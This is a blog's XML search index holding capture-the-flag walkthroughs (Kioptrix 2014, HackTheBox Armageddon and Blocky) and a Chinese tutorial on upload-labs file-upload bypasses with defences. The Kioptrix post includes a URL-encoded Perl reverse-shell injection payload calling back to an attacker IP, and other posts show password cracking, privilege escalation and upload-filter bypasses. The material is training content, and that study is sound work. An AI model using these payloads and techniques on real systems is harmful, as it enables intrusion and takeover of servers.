<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_2014</title>
    <link href="/2024/07/23/vulnhub_kioptrix_2014/"/>
    <url>/2024/07/23/vulnhub_kioptrix_2014/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-2014"><a href="#vulnhub-kioptrix-2014" class="headerlink" title="vulnhub_kioptrix_2014"></a>vulnhub_kioptrix_2014</h1><p>Finally arrived at the last box of the Kioptrix series!</p><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>I’ll start by seeking for open ports on the target box.I prefer using masscan and namp for this initial task.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112052955.png" alt="image-20231113112052955"></p><p>The only service that exposed to us is HTTP on port 80 and port 8080.</p><p>Next step I ultilize dirsearch for directory brute-force, but I could find nothing interesting.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112109035.png" alt="image-20231113112109035"></p><p>Let’s check them out in firefox:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112121440.png" alt="image-20231113112121440"></p><p>It reminds me of 403 FORBIDDEN when I access port 8080.Then I shifted my focus to port 80.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112139060.png" alt="image-20231113112139060"></p><p>It works! However, there is only the phrase “it works,” XD.</p><h4 id="Grabbing-a-shell"><a href="#Grabbing-a-shell" class="headerlink" title="Grabbing a shell"></a>Grabbing a shell</h4><p>Let’s dig deeper — view page source:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112158809.png" alt="image-20231113112158809"></p><p>Well, now we get something new!</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112209835.png" alt="image-20231113112209835"></p><p>I failed to find file upload or command injection vulnerabilities that could help me access a reverse shell when I explore this new page. However, <code>pChart2.1.3</code> in url seized my attention.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112221479.png" alt="image-20231113112221479"></p><p>The following steps are quite explicit.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112232895.png" alt="image-20231113112232895"></p><p>It’s evident that there exists a arbitrary file read vulnerability.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112247139.png" alt="image-20231113112247139"></p><p>However, we cannot rely on this vulnerability to gain access to the box, we must integrate it with other vulnerabilities. At this point, I recalled the earlier 403 page.</p><p>I googled default path of apache config file:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112302555.png" alt="image-20231113112302555"></p><p>Let’s go to check its configuration:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112314281.png" alt="image-20231113112314281"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Allow <span class="hljs-keyword">from</span> <span class="hljs-attribute">env</span>=Mozilla4_browser<br></code></pre></td></tr></table></figure><p>Access port 8080 using burp suite to check User-Agent.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112332206.png" alt="image-20231113112332206"></p><p>Turn to proxy-settings, Match and replace rules, and then ticket Mozilla&#x2F;4.0:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112343264.png" alt="image-20231113112343264"></p><p>Let’s try again:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112433172.png" alt="image-20231113112433172"></p><p>BINGO! Now we can access port 8080.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112543854.png" alt="image-20231113112543854"></p><p>Nevigate phptax directory and I cound not understand the presented page.</p><p>At this step, I will also suggest searchsploit:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112556288.png" alt="image-20231113112556288"></p><p><img src="/vulnhub_kioptrix_2014/image-20231113112602381.png" alt="image-20231113112602381"></p><p>So far, I can use the vulnerability mentioned above to grab a reverse shell by accessing the following page:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.122.17:8080</span>/phptax/drawimage.php?pfilez=xxx;perl+-e+%<span class="hljs-number">27</span>use+Socket%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>i%<span class="hljs-number">3</span>D%<span class="hljs-number">22192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">111</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>p%<span class="hljs-number">3</span>D4444%<span class="hljs-number">3</span>Bsocket%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>CPF_INET%<span class="hljs-number">2</span>CSOCK_STREAM%<span class="hljs-number">2</span>Cgetprotobyname%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>tcp%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>connect%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>Csockaddr_in%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>p%<span class="hljs-number">2</span>Cinet_aton%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>i%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">7</span>Bopen%<span class="hljs-number">28</span>STDIN%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDOUT%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDERR%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bexec%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fsh+-i%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">27</span>;&amp;pdf=make<br></code></pre></td></tr></table></figure><p><img src="/vulnhub_kioptrix_2014/image-20231113112706972.png" alt="image-20231113112706972"></p><h4 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h4><p>We can identify the system version of the target box as FREEBSD 9.0-RELEASE and we can easily find two poc using searchsploit.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112718365.png" alt="image-20231113112718365"></p><p>I transfer the poc through nc because wget and some other commands are unavailable.</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112738209.png" alt="image-20231113112738209"></p><p>Compile and execute:</p><p><img src="/vulnhub_kioptrix_2014/image-20231113112754343.png" alt="image-20231113112754343"></p><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_armageddon</title>
    <link href="/2023/05/06/htb-armageddon/"/>
    <url>/2023/05/06/htb-armageddon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-armageddon"><a href="#htb-armageddon" class="headerlink" title="htb_armageddon"></a>htb_armageddon</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫端口：</p><p><img src="/htb_armageddon/image-20230506152711881.png" alt="image-20230506152711881"></p><p>这里直接扫出来80端口为drupal 7。</p><p>后台目录扫一下：</p><p><img src="/htb_armageddon/image-20230506152900917.png" alt="image-20230506152900917"></p><p>一一访问之后没有发现有用信息，但是在changelog.txt发现了具体版本号：</p><p><img src="/htb_armageddon/image-20230506152942915.png" alt="image-20230506152942915"></p><p>当前drupal版本为7.56.</p><p>火狐访问：</p><p><img src="/htb_armageddon/image-20230506153014238.png" alt="image-20230506153014238"></p><p>这里为登录框，考虑sql注入或者默认密码弱口令等等，但是由于已经框架和版本，先搜索有无对应漏洞。</p><p>searchsploit：</p><p><img src="/htb_armageddon/image-20230506153100443.png" alt="image-20230506153100443"></p><p>前四个都跟版本号对应，但是除了drupaldeggon2 rce，都需要认证，pass。</p><p>考虑利用该RCE漏洞：</p><p><img src="/htb_armageddon/image-20230506153250036.png" alt="image-20230506153250036"></p><p>CVE-2018-7600。去github查找相应poc，直接利用：</p><p><img src="/htb_armageddon/image-20230506153349570.png" alt="image-20230506153349570"></p><p>获得apache的shell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>搜索得到drupal默认配置文件的路径：</p><p><img src="/htb_armageddon/image-20230506153707967.png" alt="image-20230506153707967"></p><p><img src="/htb_armageddon/image-20230506154003209.png" alt="image-20230506154003209"></p><p>得到数据库的账号密码。</p><p>mysql登录，注意需要使用-e参数执行命令，由于不是完全交互式shell，直接登录会卡死：</p><p><img src="/htb_armageddon/image-20230506154106713.png" alt="image-20230506154106713"></p><p>筛选出pass，加密的密文，接下来考虑解密。</p><p>使用john，失败：</p><p><img src="/htb_armageddon/image-20230506154158571.png" alt="image-20230506154158571"></p><p>使用hashcat爆破，首先选择mode：</p><p><img src="/htb_armageddon/image-20230506154301967.png" alt="image-20230506154301967"></p><p>爆破：<br><code>hashcat -m 7900 pass /usr/share/wordlists/rockyou.txt</code></p><p><img src="/htb_armageddon/image-20230506154328257.png" alt="image-20230506154328257"></p><p>得到密码booboo，22端口开放，直接ssh登录：</p><p><img src="/htb_armageddon/image-20230506154359188.png" alt="image-20230506154359188"></p><p>sudo -l，发现可以sudo直接snap命令。去gtfobins搜索该命令：</p><p><img src="/htb_armageddon/image-20230506154436272.png" alt="image-20230506154436272"></p><p>先在本地kali生成一个.snap文件，再上传到靶机上执行。</p><p>如果kali没有fpm，先安装<code>gem install fpm</code>，接着生成.snap文件，command就是要执行的命令：</p><p><img src="/htb_armageddon/image-20230506154512221.png" alt="image-20230506154512221"></p><p>在靶机上下载该文件，wget失败，因此使用curl保存，再执行提权命令：</p><p><img src="/htb_armageddon/image-20230506154621073.png" alt="image-20230506154621073"></p><p>uid&#x3D;0，root权限。</p><p>修改command为cat &#x2F;root&#x2F;root.txt:</p><p><img src="/htb_armageddon/image-20230506154648840.png" alt="image-20230506154648840"></p><p>执行：</p><p><img src="/htb_armageddon/image-20230506154713102.png" alt="image-20230506154713102"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blocky</title>
    <link href="/2023/05/05/htb-blocky/"/>
    <url>/2023/05/05/htb-blocky/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blocky"><a href="#htb-blocky" class="headerlink" title="htb_blocky"></a>htb_blocky</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/htb-blocky/image-20230505100458297.png" alt="image-20230505100458297"></p><p><img src="/htb-blocky/image-20230505100513185.png" alt="image-20230505100513185"></p><p>访问http（记得添加dns解析）：</p><p><img src="/htb-blocky/image-20230505100551956.png" alt="image-20230505100551956"></p><p>目录爆破：</p><p><img src="/htb-blocky/image-20230505100715971.png" alt="image-20230505100715971"></p><p>这里有几个目录需要关注，首先是wp-login.php，表明这是wordpress，其次还存在phpmyadmin，可以考虑写shell，还有&#x2F;plugins。</p><p>phpmyadmin:</p><p><img src="/htb-blocky/image-20230505100857737.png" alt="image-20230505100857737"></p><p>弱口令失败，常规的登录界面：</p><p><img src="/htb-blocky/image-20230505101115855.png" alt="image-20230505101115855"></p><p>&#x2F;plugins：</p><p><img src="/htb-blocky/image-20230505101142490.png" alt="image-20230505101142490"></p><p>存在两个jar包，下载至本地，利用jd-gui查看：</p><p><img src="/htb-blocky/image-20230505101337316.png" alt="image-20230505101337316"></p><p>在blockycore.class中发现一组账号密码:root&#x2F;8YsqfCTnvxAUeduzjNSXe22</p><p>由于网站为wordpress，用wpscan扫一下：</p><p><code>wpscan --url http://blocky.htb -e u,ap</code></p><p><img src="/htb-blocky/image-20230505101556152.png" alt="image-20230505101556152"></p><p>发现用户notch。</p><p>接下来尝试利用账号密码登录wordpress，失败。</p><p>用该账户登录phpmyadmin：</p><p><img src="/htb-blocky/image-20230505101918535.png" alt="image-20230505101918535"></p><p>成功登录，并且查到notch用户。</p><p>不知道绝对路径和网站目录路径，因此跳过phpmyadmin写shell，再利用该账户ssh：</p><p><img src="/htb-blocky/image-20230505102933041.png" alt="image-20230505102933041"></p><p>root登录失败，notch登录成功。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>sudo -l：</p><p><img src="/htb-blocky/image-20230505103014481.png" alt="image-20230505103014481"></p><p>可以执行所有命令，直接&#x2F;bin&#x2F;bash:</p><p><img src="/htb-blocky/image-20230505103044495.png" alt="image-20230505103044495"></p><p>root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>file_upload</title>
    <link href="/2023/04/27/file-upload/"/>
    <url>/2023/04/27/file-upload/</url>
    
    <content type="html"><![CDATA[<h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><p><img src="/file-upload/pic.jpg" alt="pic"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>简单来说，存在文件上传，就可能存在文件上传漏洞。上传文件时，如果未对上传的文件进行严格的验证和过滤，就可能导致传入非法文件，例如木马等等。</p><h3 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h3><p>上传漏洞与SQL注入或 XSS相比，其风险更大。</p><p>如果 Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，就会导致代码执行。如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为。如果上传的文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个webshell到服务器上完全控制系统。</p><h3 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h3><ul><li><p>fofa等引擎搜索。例如inurl:upload.php.</p></li><li><p>黑盒。使用敏感目录扫描工具查找:御剑后台扫描工具，dirsearch等等。</p></li><li><p>白盒。找对cms，看源码。</p></li><li><p>后台查找。进入后台之后并不能获得网站权限，只是后台权限，可以通过登录后台进行文件上传从而获得整个网站的权限。</p></li><li><p>会员中心，个人资料等模块查找。</p></li></ul><p>找到上传点之后，是否具有上传漏洞，具体情况需要结合抓包情况查看。</p><h3 id="upload-labs靶场介绍"><a href="#upload-labs靶场介绍" class="headerlink" title="upload-labs靶场介绍"></a>upload-labs靶场介绍</h3><p><img src="/file-upload/uploadlabs.png" alt="image-20211025002900015"></p><p>upload-labs是一个使用php语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场。提供了文件上传的各种不同环境，用以进行原理的学习。</p><p>项目地址:<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>本文档主要介绍文件上传部分内容，靶场搭建等部分不进行详细讲解，可以参考：<a href="https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163509252516780271586181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&utm_term=uploadlabs%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163509252516780271586181&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&amp;utm_term=uploadlabs%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187</a></p><h3 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h3><ul><li>格式</li></ul><p>正常情况下，如果将php木马上传到网站，但格式为jpg格式，一般是无法成功进行利用的（无解析漏洞）。需要注意网站所使用的语言以及上传文件的格式类型。</p><ul><li>分类</li></ul><p>对于文件上传漏洞，需要注意的是清楚地把握住出现漏洞的点。例如是编辑器漏洞，还是第三方应用漏洞，或者是代码的逻辑中存在漏洞。针对不同的漏洞，应该采用更有针对性的方法。在下文会对不同的分类具体展开。</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h4 id="js类防护"><a href="#js类防护" class="headerlink" title="js类防护"></a>js类防护</h4><p><strong>Pass-01</strong></p><ul><li>靶场环境中，可以直接删除js过滤代码</li><li>真实环境中可以考虑浏览器禁用js（可能会导致正常功能无法使用，不推荐）</li></ul><p>浏览器禁用javascript方法（Firefox为例）：</p><p>搜索栏中输入about:config，确定之后搜索javascript.enabled,点击切换即可禁用js脚本</p><p><img src="/file-upload/firefox.png" alt="image-20211025135825125"></p><p>Tips:有时候上传文件使用burp抓包无法捕获到流量，可能就是因为采用了本地js的验证方法。</p><p><strong>防护措施</strong></p><p>尽量使用后端验证</p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>文件上传的后端验证主要有后缀名，文件类型和文件头等等。其中后缀名主要使用黑白名单进行验证，文件类型主要通过MIME信息验证，而文件头一般通过内容头进行校验。</p><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是指只要后缀名不在给定的数组中，就不会被拦截，可以进行上传。常见的黑名单有asp,php,jsp,aspx,cgi,war等等。一般可以通过如下几种方式绕过：</p><h5 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h5><p><strong>Pass-03</strong></p><p>首先查看源码：</p><p><img src="/file-upload/pass3code.png" alt="image-20211025145816144"></p><p>典型的黑名单过滤，上传php文件，上传失败：</p><p><img src="/file-upload/fail.png" alt="image-20211025144503909"></p><p>以最常用的php为例，如果黑名单中只有.php后缀，可以通过php3,php5,phtml等未被过滤的后缀名进行绕过，上传.php5进行测试：</p><p><img src="/file-upload/pass3s.png" alt="image-20211025150600496"></p><p>上传成功。</p><p>对于该绕过方法，在Apache服务器中，可以通过更改Apache httpd.conf配置文件，添加.php3 和.phtml，并且取消注释，来实现对php3,phtml等文件的解析。</p><p><img src="/file-upload/apache.png" alt="image-20211025150142567"></p><p><strong>防护措施</strong></p><p>拓展黑名单的内容，并且对服务器配置进行严格限制，即使文件上传也无法解析</p><h5 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h5><p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>Tips:只有Apache才可以</p><p><strong>Pass-04</strong></p><p>查看源码：</p><p><img src="/file-upload/pass4code.png" alt="image-20211025163819926"></p><p>可以看出，这里也是使用了黑名单的方式进行过滤。但是.htaccess并不在黑名单中，因此首先上传.htaccess文件：</p><p><img src="/file-upload/htaccess.png" alt="image-20211025152331749"></p><p>这里.htaccess文件的意义是将后续上传的文件，当作php来进行解析。</p><p>Tips:</p><ul><li>如果上传的内容如上图所示，那么后续上传的文件名或后缀名中需要包含有info，也就是双引号中的值。</li><li>如果文件的内容为<code>setHandler application/x-httpd-php</code>，那么，任意形式的文件都会被当作php解析。</li><li>文件名后缀命名时记得绕开黑名单中的后缀名。</li><li>上传的.htaccess文件，通过记事本可能无法保存，可以通过burp修改文件名或者使用Notepad++保存文件。</li></ul><p>接下来对上传的info.abc进行测试：</p><p><img src="/file-upload/pass4s.png" alt="image-20211025164521803"></p><p>上传成功，查看phpinfo:</p><p><img src="/file-upload/pass4info.png" alt="image-20211025164609493"></p><p>成功解析成php文件。</p><p><strong>防护措施</strong></p><p>禁止上传.htaccess文件，可以通过snort对filename的内容进行检测</p><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>Pass-05</strong></p><p>查看源码：</p><p><img src="/file-upload/pass5code.png" alt="image-20211025164929968"></p><p>使用黑名单进行过滤，这里直接使用大小写绕过：</p><p><img src="/file-upload/pass5s.png" alt="image-20211025165114713"></p><p>成功上传php文件。</p><p><strong>防护措施</strong></p><p>拓展黑名单内容</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p><strong>Pass-06</strong></p><p>查看源码：</p><p><img src="/file-upload/pass6code.png" alt="image-20211025165335192"></p><p>发现这里没有使用trim()函数，也就是没有对空格进行过滤。因此尝试使用空格绕过：</p><p><img src="/file-upload/pass6s.png" alt="image-20211025165548554"></p><p>使用burp在filename内容最后加上空格，绕过黑名单验证，成功上传。</p><p>Tips:</p><ul><li>必须抓包后在最后添加空格，如果直接在本地文件后缀加空格会被自动删除。</li><li>抓包添加空格之后，会绕过黑名单的验证，但是保存到服务器之后，文件最后的空格还是会被删除，最终还是php文件。</li></ul><p><strong>防护措施</strong></p><p>拓展黑名单，或者使用函数删除文件名末尾的空格再进行过滤。</p><p>也可写规则对空格0d0a进行匹配。</p><h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p><strong>Pass-07</strong></p><p>源码如下：</p><p><img src="/file-upload/pass7code.png" alt="image-20211025170004591"></p><p>这里少了deldot()函数，即删除文件名末尾的点。</p><p>这里思路和空格绕过相同，但是同样需要注意只能通过抓包修改，直接在本地修改会默认删除最后的点，抓包添加点之后会绕过黑名单，但是保存到服务器之后同样最后的点会被删除，还是原来的文件格式：</p><p><img src="/file-upload/pass7s.png" alt="image-20211025170344273"></p><p><img src="/file-upload/type.png" alt="image-20211025170445942"></p><p>到上传目录查看，还是原理的php格式，并能成功解析。</p><p><strong>防护措施</strong></p><p>使用函数先删除文件名末尾的.再进行过滤。</p><p>写规则对点0d0a进行匹配。</p><h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p><strong>Pass-08</strong></p><p>审计源码发现，没有使用stri_replace函数替换字符串::$DATA。</p><p><img src="/file-upload/pass8code.png" alt="image-20211025170728809"></p><p>在windows下，如果文件名+”::$DATA”，系统会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。例如:phpinfo.php::$DATA，Windows会自动去掉末尾的::$DATA变成phpinfo.php。利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p><img src="/file-upload/pass8s.png" alt="image-20211025170934067"></p><p>上传成功。</p><p><strong>防护措施</strong></p><p>先删除文件名末尾的::$DATA再过滤操作</p><p>对filename中的::$DATA进行匹配（已经添加规则）</p><h5 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a>点加空格加点绕过</h5><p><strong>Pass-09</strong></p><p>审计源码：</p><p><img src="/file-upload/pass9code.png" alt="image-20211025171317917"></p><p>这里首先会去除空格，接着删除文件名末尾的点，最后再去空。</p><p>因为最后会去空，因此文件名结尾不能为空格，可以结合点绕过进行考虑。文件名末尾为点，删除空格就加上空格，开始还会删除一个点，因此再加上点，也就是<code>. .</code>，测试：</p><p><img src="/file-upload/pass9s.png" alt="image-20211025172046926"></p><p>成功绕过过滤，上传文件。</p><p><strong>防护措施</strong></p><p>删除文件名末尾的点，空格再过滤</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>Pass-10</strong></p><p>源码：</p><p><img src="/file-upload/pass10code.png" alt="image-20211025172233670"></p><p>这里直接上传文件，成功：</p><p><img src="/file-upload/pass10t.png" alt="image-20211025172429960"></p><p>到对应目录下查看，发现文件为：</p><p><img src="/file-upload/info.png" alt="image-20211025172515208"></p><p>文件格式不对是无法进行解析的。本关中过滤思路为直接删除黑名单中的后缀名，因此双写进行绕过：</p><p><img src="/file-upload/pass10s.png" alt="image-20211025172629452"></p><p>文件格式为php，可以正常解析。</p><p><strong>防护措施</strong></p><p>对文件名的过滤使用循环过滤来替代单次过滤</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是指只有后缀名在给定的数组中，才不会被拦截，可以进行上传。较黑名单而言，白名单验证往往更为安全。但是也有如下几类绕过方式：</p><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p><strong>Pass-02</strong></p><p>查看源码：</p><p><img src="/file-upload/pass2code.png" alt="image-20211025143831680"></p><p>先简单介绍一下$FILES函数：<br>$_FILES[myFile] [name]:客户端文件的原名称</p><p>$_FILES[myFile] [type]:文件的MIME类型</p><p>$_FILES[myFile] [size]:上传文件的大小，单位为字节</p><p>$_FILES[myFile] [tmp_name]:文件被上传后在服务端存储的临时文件名</p><p>$_FILES[myFile] [error]:和该文件上传相关的错误代码</p><p>通过源码可以发现，这里通过对MIME类型的验证进行过滤。上传文件测试：</p><p><img src="/file-upload/fail.png" alt="image-20211025144503909"></p><p>上传失败，抓包查看：</p><p><img src="/file-upload/pass2p.png" alt="image-20211025144604979"></p><p>对content-type内容进行修改：</p><p><img src="/file-upload/pass2s.png" alt="image-20211025144748487"></p><p>上传成功。</p><p>因此，单纯通过对MIME类型进行验证是很不安全的。</p><p><strong>防护措施</strong></p><p>对MIME,后缀名进行匹配验证。</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p><strong>Pass-11</strong></p><p>这里的%00截断需要与后面的00截断区分开。%00截断主要使用在地址中。</p><p>首先查看源码：</p><p><img src="/file-upload/pass11code.png" alt="image-20211025175804899"></p><p>非常典型的白名单过滤。首先抓包：</p><p><img src="/file-upload/pass11f.png" alt="image-20211025175934766"></p><p>这里发现url中带有参数save_path.结合源码发现，本关的文件，上传之后，保存到file_upload_path中，而file_upload_path由save_path,随机数和日期拼接而成。例如save_path为..&#x2F;upload，那么保存的路径就是..&#x2F;upload&#x2F;6620211025.jpg（jpg是上传的文件的后缀）。此处利用%00对后续内容进行截断，例如save_path为..&#x2F;upload&#x2F;a.php%00，正常来说保存路径应该是..&#x2F;upload&#x2F;a.php%006620211025.jpg，但是%00会将后面的随机数及日期部分丢弃，直接保存为a.php，测试：</p><p><img src="/file-upload/pass11s.png" alt="image-20211025180435295"></p><p>上传成功。</p><p>Tips:此处的文件名后缀，一定要在白名单中，不然会被拦截，即使后缀为jpg，但是截断时保存为php，依然能够被解析：</p><p><img src="/file-upload/pass11info.png" alt="image-20211025180635064"></p><p><strong>防护措施</strong></p><p>对url中的00进行匹配（已添加规则）</p><h5 id="00截断-1"><a href="#00截断-1" class="headerlink" title="00截断"></a>00截断</h5><p><strong>Pass-12</strong></p><p>源码：</p><p><img src="/file-upload/pass12code.png" alt="image-20211025205040477"></p><p>这里的提交方式由get变成了post，同样修改save_path参数的值。</p><p>注意：00截断与前文的%00截断的区别在于，%00截断主要用于地址，例如上一关所示的文件上传地址，并且get方法会自动解码%00，因此直接输入%00即可，但是post方法不会，因此需要先将其编码才能实现截断的效果。</p><p><img src="/file-upload/pass12en.png" alt="image-20211025211523737"></p><p>上传的文件名后缀为白名单中的jpg，MIME格式无需修改，将save_path加上hahaha.php%00，再使用编码功能对%00进行编码，最后发送数据包，上传成功：</p><p><img src="/file-upload/pass12s.png" alt="image-20211025211121816"></p><p>文件名为我们修改的hahaha.php，并能成功解析：</p><p><img src="/file-upload/pass12info.png" alt="image-20211025211716502"></p><p><strong>防护措施</strong></p><p>对post参数的内容进行00匹配</p><h4 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h4><h5 id="上传图片马配合文件包含漏洞"><a href="#上传图片马配合文件包含漏洞" class="headerlink" title="上传图片马配合文件包含漏洞"></a>上传图片马配合文件包含漏洞</h5><p>上传图片马可以用来突破getimagesize，exif_imagetype等函数，就不一一举例，原理和方法都相同，接下来以Pass-13进行说明。</p><p><strong>Pass-13</strong></p><p>图片马是指将木马插入到图片中，并且不影响图片的正常显示。</p><p>图片马的制作一般有如下几种方法：</p><ul><li>以文本方式打开图片</li></ul><p>在文件末尾直接写一句话木马。</p><ul><li>使用cmd制作木马</li></ul><p>copy aaa.jpg &#x2F;b + trojan.php &#x2F;a 